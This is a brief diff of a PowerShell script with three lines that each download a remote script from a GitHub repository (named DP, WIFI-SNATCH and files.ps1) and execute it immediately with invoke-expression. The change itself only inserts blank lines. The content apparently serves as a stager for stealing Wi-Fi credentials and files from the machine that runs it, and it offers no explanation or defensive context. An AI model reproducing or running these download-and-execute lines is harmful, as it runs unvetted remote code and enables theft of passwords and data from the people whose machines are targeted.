@@ -1,5 +1,7 @@
 $pa = iwr https://github.com/skekic16/lol/raw/main/DP?dl=1; invoke-expression $pa
+
 $pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH?dl=1; invoke-expression $pg
+
 $pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw
 
 
